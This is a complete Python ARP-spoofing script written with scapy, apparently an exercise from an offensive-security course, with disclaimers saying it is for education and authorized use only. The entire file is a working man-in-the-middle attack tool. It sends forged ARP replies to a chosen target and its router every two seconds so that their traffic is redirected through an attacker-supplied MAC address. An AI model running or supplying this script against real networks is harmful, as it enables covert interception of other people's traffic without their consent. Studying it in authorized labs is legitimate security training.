#!/usr/bin/env python3

# Author: Cristian Estarellas
# Version: Final version from hack4you
# Year: 2025
# Source: hack4you.io

# This script is the final version with personal modifications from the practice during the course Offensive Python.
# The goal of this script is strictly for educational purposes and should only be used in a controlled environment 
# with proper authorization.

# Disclaimer:
# This script is provided for educational and research purposes only.
# The author assumes no responsibility for any misuse or illegal activities carried out with this script.

import scapy.all as scapy
import argparse
import signal
import time
import sys

from termcolor import colored

# Ctrol+C: Exit
def def_handler(sig, frame):
    print(colored(f"\n[!] Exit...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-t","--target", required=True, dest="ip_address", help="Host / IP range to Spoof")
    parser.add_argument("-r","--router", required=True, dest="router_address", help="Router to Spoof")
    parser.add_argument("-m","--mac", required=True, dest="mac_address", help="MAC address that is used to intercept the conection")

    return parser.parse_args()

def spoof(ip_address,ip_spoof,mac):
    arp_packet = scapy.ARP(op=2, psrc=ip_spoof, pdst=ip_address, hwsrc=mac) # Building ARP packet
    scapy.send(arp_packet, verbose=False)                                   # Sending ARP packet

def main():
    args = get_arguments()
    while True:
        spoof(args.ip_address, args.router_address, args.mac_address)
        spoof(args.router_address, args.ip_address, args.mac_address)

        time.sleep(2) # to update the arp every 2 seconds

if __name__ == '__main__':
    main()
